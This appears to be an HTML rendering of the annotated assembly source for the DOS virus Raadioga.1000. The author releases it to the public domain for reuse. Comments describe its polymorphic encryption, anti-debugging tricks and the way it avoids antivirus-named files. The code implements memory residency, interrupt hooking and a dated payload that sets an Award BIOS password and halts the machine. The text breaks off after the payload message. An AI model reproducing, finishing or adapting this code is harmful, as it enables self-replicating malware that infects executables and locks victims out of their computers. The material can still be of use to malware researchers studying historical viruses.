<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Raadioga.1000.a - raadio10.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;Raadioga.1000 v1.0 24.Mar.1997 NiL</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Licence :]</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;As this code has been around for about two years and is widely recognized by</span><span class="sc0">
</span><span class="sc1">;several AV utilities I decided to make it a public domain. So You can take it</span><span class="sc0">
</span><span class="sc1">;or leave it / modify it / use it for Your own purposes etc. If You wish to</span><span class="sc0">
</span><span class="sc1">;show respect to my work leave those magic letters NiL inside code. BTW this</span><span class="sc0">
</span><span class="sc1">;is not my pseudonym. It is rather a codename for my activity of producing</span><span class="sc0">
</span><span class="sc1">;these tiny self-replicating pieces of code. Have fun!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Introduction</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;Polymorphic memory resident .EXE infector for DOS executables. All .EXE files</span><span class="sc0">
</span><span class="sc1">;in current directory are infected on following Int21 calls:</span><span class="sc0">
</span><span class="sc1">;   ah,1Ah   Set DTA</span><span class="sc0">
</span><span class="sc1">;   ah,0Eh   Set default disk</span><span class="sc0">
</span><span class="sc1">;   ah,11h   Find first via file FCB</span><span class="sc0">
</span><span class="sc1">;   ax,713Bh Set default dir (Win95)</span><span class="sc0">
</span><span class="sc1">;The payload activates on the 10th of March. At this time it enables Award BIOS</span><span class="sc0">
</span><span class="sc1">;password, displays a message and enters an infinite loop. The code is quite</span><span class="sc0">
</span><span class="sc1">;bug-free, well-commented and highly optimized for size. Written on my</span><span class="sc0">
</span><span class="sc1">;ever-young 4.77MHz XT.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Features You might find interesting</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;Polymorphism</span><span class="sc0">
</span><span class="sc1">;  Quite a simple code-swapping algorithm. Enough to avoid pattern search.</span><span class="sc0">
</span><span class="sc1">;  The interesting thing about this feature is that it changes a portion of</span><span class="sc0">
</span><span class="sc1">;  decryption code according to infection date after each two weeks. This leads</span><span class="sc0">
</span><span class="sc1">;  to belief that the code is not polymorphic. (Thats why several versions</span><span class="sc0">
</span><span class="sc1">;  of AV utilities fail to find all the variations even nowadays. For example</span><span class="sc0">
</span><span class="sc1">;  the AV guys at Symantec seem to think that variations are some kind of</span><span class="sc0">
</span><span class="sc1">;  modifications of this virii :). Anyway the variation generated for example</span><span class="sc0">
</span><span class="sc1">;  on 24-Mar-1997 is quite different of a variation generated on 01-Jan-2000.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Encryption</span><span class="sc0">
</span><span class="sc1">;  Stupid XOR/SUB/ADD encryption. When host is started the decryptor is</span><span class="sc0">
</span><span class="sc1">;  placed into Int8 (timer) interrupt handler and thus executed automatically</span><span class="sc0">
</span><span class="sc1">;  after a while - a problem for debuggers which enter into Int8 handler.</span><span class="sc0">
</span><span class="sc1">;  Even more - it is combined with a trick of modifing a jmp instruction</span><span class="sc0">
</span><span class="sc1">;  after handler execution which causes the waiting loop to terminate</span><span class="sc0">
</span><span class="sc1">;  jumping into middle of the same (modified jmp) instruction.</span><span class="sc0">
</span><span class="sc1">;  Confusing - maybe...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Anti-debugging/anti-disassembling</span><span class="sc0">
</span><span class="sc1">;  As I wished to keep the size 1000 only some really simple features. Nothing</span><span class="sc0">
</span><span class="sc1">;  advanced like tunneling, running line etc.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Multi-infection</span><span class="sc0">
</span><span class="sc1">;  With possibility of 3/64 infects a file multiple times.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;AV check on infection</span><span class="sc0">
</span><span class="sc1">;  Does not infect files starting with F-*, SC*, TB*, AV*, VI*, VS*.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Stealth (?)</span><span class="sc0">
</span><span class="sc1">;  Sorry for calling it "Stealt" but do You always notice file size growth of</span><span class="sc0">
</span><span class="sc1">;  1000 bytes? The software does :-(</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Award BIOS password setting</span><span class="sc0">
</span><span class="sc1">;  Sets the necessary bits and recalculates checksum.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;FD write protection check.</span><span class="sc0">
</span><span class="sc1">;  Reads and tries to write back a sector using Int13 services.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;File Read-Only bit removal</span><span class="sc0">
</span><span class="sc1">;  Removes the R-bit when needed and sets back after the job is done.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;For further reading visit:</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;http://www.avpve.com/viruses/r/raadioga.html</span><span class="sc0">
</span><span class="sc1">;http://www.datafellows.com/v-descs/raadioga.htm</span><span class="sc0">
</span><span class="sc1">;http://www.symantec.com/avcenter/venc/ebld/enc.cgi?vid=7542&amp;lang=us</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;Greetings</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;to virii writers - keep up a good work &amp; don't write harmful virii,</span><span class="sc0">
</span><span class="sc1">;to Wannabees for having an interest in something most people do not have:</span><span class="sc0">
</span><span class="sc1">;   Knowledge (no ironics),</span><span class="sc0">
</span><span class="sc1">;to AV people for earning their living in fighting our progs (no ironics),</span><span class="sc0">
</span><span class="sc1">;to VLAD for producing high-quality technical magazines,</span><span class="sc0">
</span><span class="sc1">;to Ralf Brown for his wonderful interrupt list,</span><span class="sc0">
</span><span class="sc1">;to creators of SoftIce, Sourcer, Hiew for magnificent tools,</span><span class="sc0">
</span><span class="sc1">;to all involved in the scene (Sorry, I think I'm going to leave the scene</span><span class="sc0">
</span><span class="sc1">;  soon).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;Here it comes and assembles using commands:</span><span class="sc0">
</span><span class="sc1">;tasm /m2 raadio10.asm</span><span class="sc0">
</span><span class="sc1">;tlink /t /x raadio10.obj</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">ProgOfs</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@Crypt</span><span class="sc0">       </span><span class="sc1">;De|encrytor offset</span><span class="sc0">
</span><span class="sc5">VirSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">        </span><span class="sc1">;Size of virus code</span><span class="sc0">
</span><span class="sc5">CrySize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc4">-</span><span class="sc5">@Crted</span><span class="sc0">     </span><span class="sc1">;Size of encrypted code</span><span class="sc0">
</span><span class="sc5">DtaOfs</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">VirSize</span><span class="sc0">         </span><span class="sc1">;Disk Transfer Area buffer offset</span><span class="sc0">
</span><span class="sc5">BufOfs</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">DtaOfs</span><span class="sc4">+</span><span class="sc2">43</span><span class="sc0">       </span><span class="sc1">;Encryption Buffer Offset</span><span class="sc0">
</span><span class="sc5">BufSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">VirSize</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc0">     </span><span class="sc1">;Encryption Buffer Size</span><span class="sc0">
</span><span class="sc5">AllSize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">BufOfs</span><span class="sc4">+</span><span class="sc5">BufSize</span><span class="sc0">      </span><span class="sc1">;Size of code and buffer</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">@Begin</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@Start</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">@Crypt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc4">)-</span><span class="sc2">2</span><span class="sc0">  </span><span class="sc1">;Encryption offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">CrySize</span><span class="sc4">/</span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">;Size of code to crypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">;Encryption key</span><span class="sc0">
</span><span class="sc5">@CrNxt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">      </span><span class="sc1">;De|encrypt word</span><span class="sc0">
    </span><span class="sc6">nop</span><span class="sc0">             </span><span class="sc1">;Placeholder</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,-</span><span class="sc2">2</span><span class="sc0">           </span><span class="sc1">;Decrement pointer</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">@CrNxt</span><span class="sc0">          </span><span class="sc1">;De|encrypt next word</span><span class="sc0">
</span><span class="sc5">@CrRet</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Set "Decryption done" flag</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">                </span><span class="sc1">;Return from int 08h handler</span><span class="sc0">
</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">@Start</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">ProgOfs</span><span class="sc0">      </span><span class="sc1">;Virus offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3508h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">;Get interrupt 08h handler address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">;Set our interrupt 08h handler</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EBh</span><span class="sc0">            </span><span class="sc1">;jmp $ - 2</span><span class="sc0">
</span><span class="sc5">CrypFlg</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0FEh</span><span class="sc0">            </span><span class="sc1">;Decrypt not yet done? (FEh-&gt;(FFh=dec))</span><span class="sc0">
</span><span class="sc5">@Crted</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">4Ch</span><span class="sc0">         </span><span class="sc1">;byte ptr [si+CrypFlg-ProgOfs]</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc5">CrypFlg</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3B05h</span><span class="sc0">        </span><span class="sc1">;mov ax,2508h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">         </span><span class="sc1">;Restore original interrupt 08h handler</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;EOI signal</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc2">005h</span><span class="sc4">,</span><span class="sc2">0FEh</span><span class="sc4">,</span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc2">0FCh</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0BF8Ch</span><span class="sc0">       </span><span class="sc1">;mov ax,2A77h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">;Virus already resident?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@Done</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">030Ah</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">@Spec</span><span class="sc0">           </span><span class="sc1">;10th of March code</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">;Segment of programs PSP</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">;Calculate address of programs MCB</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],(</span><span class="sc5">AllSize</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;New size of programs memory block</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;Calculate address of viruses MCB</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;Get/Set type of programs memory block</span><span class="sc0">

    </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">;Set type of viruses memory block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;Set owner of viruses memory block (DOS)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">AllSize</span><span class="sc4">+</span><span class="sc2">0Fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">               </span><span class="sc1">;Set size of viruses memory block</span><span class="sc0">

    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">VirSize</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsw</span><span class="sc0">           </span><span class="sc1">;Copy virus code to new memory block</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">               </span><span class="sc1">;Copy Int 21h on Int 03h</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">Ofs21</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">               </span><span class="sc1">;Get old Int 21h handler address</span><span class="sc0">
    </span><span class="sc6">movsw</span><span class="sc0">

    </span><span class="sc6">cli</span><span class="sc0">             </span><span class="sc1">;Set our Int 21h handler</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc5">@New21</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">@Done</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">           </span><span class="sc1">;Segment address of PSP</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">          </span><span class="sc1">;Add PSP size</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">OldCS</span><span class="sc4">-</span><span class="sc5">ProgOfs</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@FlCue</span><span class="sc0">          </span><span class="sc1">;Flush processur queue (for 486)</span><span class="sc0">
</span><span class="sc5">@FlCue</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc0">         </span><span class="sc1">;add ax,</span><span class="sc0">
</span><span class="sc5">OldSS</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;original ss</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0BCh</span><span class="sc0">            </span><span class="sc1">;mov sp,</span><span class="sc0">
</span><span class="sc5">OldSP</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;original sp</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0EAh</span><span class="sc0">            </span><span class="sc1">;Jump to</span><span class="sc0">
</span><span class="sc5">OldIP</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;original IP</span><span class="sc0">
</span><span class="sc5">OldCS</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0FFF0h</span><span class="sc0">          </span><span class="sc1">;original CS</span><span class="sc0">
</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc5">@Spec</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">          </span><span class="sc1">;Award BIOS code</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">          </span><span class="sc1">;Read password settings</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">00000011b</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;Calculate difference to bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;Enable password for Setup and System</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">          </span><span class="sc1">;Read BIOS checksum</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">           </span><span class="sc1">;Calculate new checksum into bl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">70h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">out</span><span class="sc0"> </span><span class="sc2">71h</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">          </span><span class="sc1">;Save new checksum</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">@Wr</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">07h</span><span class="sc4">,</span><span class="sc12">'HAIGUSTE RAVI KONTROLLITUD VAIKUSE PIMEDUSE JA RAADIOGA$'</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'NiL'</span><span class="sc0">
</span><span class="sc5">@Wr</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">09h</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">
